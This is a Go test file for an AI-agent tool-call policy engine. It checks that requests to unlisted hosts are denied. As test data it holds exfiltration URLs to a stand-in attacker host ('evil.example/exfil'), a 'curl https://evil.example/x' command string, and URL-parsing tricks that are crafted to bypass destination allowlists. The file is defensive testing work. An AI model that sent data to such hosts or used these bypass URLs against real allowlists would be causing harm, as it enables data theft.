package policy_test

import (
	"strings"
	"testing"

	"github.com/themayursinha/mcp-visor/internal/mcp"
	"github.com/themayursinha/mcp-visor/internal/policy"
)

const rewardSeekerPolicy = `
version: "1.0"
description: "Read local tickets; do not post to an unlisted host"
default_action: deny
servers:
  - name: "workspace"
    allowed: true
    allowed_destinations:
      - "evil.example"
    tools:
      - name: "file_read"
        allowed: true
        risk: low
      - name: "http_post"
        allowed: true
        risk: high
        rules:
          - type: allow_destination
            patterns:
              - "docs.internal"
      - name: "web_fetch"
        allowed: true
        risk: high
        rules:
          - type: allow_destination
            patterns:
              - "docs.internal"
`

func loadDestinationEngine(t *testing.T) *policy.Engine {
	t.Helper()
	p, err := policy.Load([]byte(rewardSeekerPolicy))
	if err != nil {
		t.Fatalf("load destination policy: %v", err)
	}
	return policy.NewEngine(p)
}

func evalWorkspace(eng *policy.Engine, tool string, args map[string]any) policy.Decision {
	return eng.Evaluate("workspace", mcp.ToolsCallRequest{
		Name:      tool,
		Arguments: mustMarshal(args),
	})
}

func assertDestinationEvidence(t *testing.T, reason string) {
	t.Helper()
	for _, token := range []string{
		"authority-expanding destination",
		"argument class URL",
		"effect class NETWORK",
		"authority transition MANDATE->EGRESS",
	} {
		if !strings.Contains(reason, token) {
			t.Fatalf("deny reason missing evidence %q: %s", token, reason)
		}
	}
}

func TestDestinationMandateInstantiationAllowed(t *testing.T) {
	eng := loadDestinationEngine(t)

	got := evalWorkspace(eng, "file_read", map[string]any{"path": "/workspace/tickets.md"})
	if got.Action != policy.ActionAllow {
		t.Fatalf("legitimate local read must allow, got %s: %s", got.Action, got.Reason)
	}

	got = evalWorkspace(eng, "http_post", map[string]any{"url": "https://docs.internal/api"})
	if got.Action != policy.ActionAllow {
		t.Fatalf("mandated host via url must allow, got %s: %s", got.Action, got.Reason)
	}

	got = evalWorkspace(eng, "http_post", map[string]any{"url": "https://docs.internal:443/api"})
	if got.Action != policy.ActionAllow {
		t.Fatalf("mandated host with port must allow, got %s: %s", got.Action, got.Reason)
	}

	got = evalWorkspace(eng, "web_fetch", map[string]any{"host": "Docs.Internal"})
	if got.Action != policy.ActionAllow {
		t.Fatalf("mandated host via host alias must allow, got %s: %s", got.Action, got.Reason)
	}
}

func TestDestinationAuthorityExpandingDenied(t *testing.T) {
	eng := loadDestinationEngine(t)

	got := evalWorkspace(eng, "http_post", map[string]any{"url": "https://evil.example/exfil"})
	if got.Action != policy.ActionDeny {
		t.Fatalf("http_post to evil.example must deny, got %s: %s", got.Action, got.Reason)
	}
	assertDestinationEvidence(t, got.Reason)

	got = evalWorkspace(eng, "web_fetch", map[string]any{"url": "https://evil.example/exfil"})
	if got.Action != policy.ActionDeny {
		t.Fatalf("web_fetch to the same host must deny (path-agnostic), got %s: %s", got.Action, got.Reason)
	}
	assertDestinationEvidence(t, got.Reason)

	got = evalWorkspace(eng, "http_post", map[string]any{"url": "https://docs.internal.evil.example/x"})
	if got.Action != policy.ActionDeny {
		t.Fatalf("suffix spoof must deny, got %s: %s", got.Action, got.Reason)
	}
}

func TestDestinationEveryPresentAliasIsChecked(t *testing.T) {
	eng := loadDestinationEngine(t)
	got := evalWorkspace(eng, "http_post", map[string]any{
		"url":  "https://docs.internal/api",
		"host": "evil.example",
	})
	if got.Action != policy.ActionDeny {
		t.Fatalf("shadow host alias must deny, got %s: %s", got.Action, got.Reason)
	}
	assertDestinationEvidence(t, got.Reason)
}

func TestDestinationMissingFailsClosed(t *testing.T) {
	eng := loadDestinationEngine(t)
	cases := []struct {
		name string
		args map[string]any
	}{
		{name: "missing", args: map[string]any{"body": "hi"}},
		{name: "blank", args: map[string]any{"url": "   "}},
		{name: "non-string", args: map[string]any{"url": 123}},
		{name: "scheme-only", args: map[string]any{"url": "https://"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := evalWorkspace(eng, "http_post", tc.args)
			if got.Action != policy.ActionDeny {
				t.Fatalf("missing/blank destination must deny, got %s: %s", got.Action, got.Reason)
			}
			if !strings.Contains(got.Reason, "destination is required") {
				t.Fatalf("want destination is required, got %s", got.Reason)
			}
		})
	}
}

func TestDestinationEmptyAllowlistFailsClosed(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "workspace"
    allowed: true
    tools:
      - name: "http_post"
        allowed: true
        rules:
          - type: allow_destination
            patterns: ["   "]
`
	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	eng := policy.NewEngine(p)
	got := evalWorkspace(eng, "http_post", map[string]any{"url": "https://docs.internal/api"})
	if got.Action != policy.ActionDeny {
		t.Fatalf("empty allowlist must deny, got %s: %s", got.Action, got.Reason)
	}
	if !strings.Contains(got.Reason, "destination allowlist is empty") {
		t.Fatalf("want empty allowlist reason, got %s", got.Reason)
	}
}

func TestServerAllowedDestinationsRemainInert(t *testing.T) {
	yaml := `
version: "1.0"
default_action: deny
servers:
  - name: "workspace"
    allowed: true
    allowed_destinations:
      - "docs.internal"
    denied_destinations:
      - "evil.example"
    tools:
      - name: "http_post"
        allowed: true
`
	p, err := policy.Load([]byte(yaml))
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	eng := policy.NewEngine(p)
	got := evalWorkspace(eng, "http_post", map[string]any{"url": "https://evil.example/exfil"})
	if got.Action != policy.ActionAllow {
		t.Fatalf("parent gap: server destination fields must not bind, got %s: %s", got.Action, got.Reason)
	}
}

func TestDestinationAmbiguousAuthorityFailsClosed(t *testing.T) {
	eng := loadDestinationEngine(t)
	cases := []struct {
		name string
		url  string
	}{
		{name: "backslash-at", url: "https://evil.example\\@docs.internal/x"},
		{name: "userinfo", url: "https://evil.example@docs.internal/x"},
		{name: "percent-in-authority", url: "https://evil.example%2f@docs.internal/x"},
		{name: "backslash-path", url: "https://evil.example\\docs.internal/x"},
		{name: "embedded-scheme", url: "https:evil.example://docs.internal/x"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := evalWorkspace(eng, "http_post", map[string]any{"url": tc.url})
			if got.Action != policy.ActionDeny {
				t.Fatalf("ambiguous authority must deny, got %s: %s", got.Action, got.Reason)
			}
			if !strings.Contains(got.Reason, "destination is required") {
				t.Fatalf("want unparseable destination, got %s", got.Reason)
			}
		})
	}
}

func TestDestinationDoesNotInspectMailboxOrCommand(t *testing.T) {
	eng := loadDestinationEngine(t)
	got := evalWorkspace(eng, "http_post", map[string]any{
		"url":     "https://docs.internal/api",
		"to":      "attacker@evil.example",
		"command": "curl https://evil.example/x",
	})
	if got.Action != policy.ActionAllow {
		t.Fatalf("mailbox/command keys are out of model, got %s: %s", got.Action, got.Reason)
	}
}
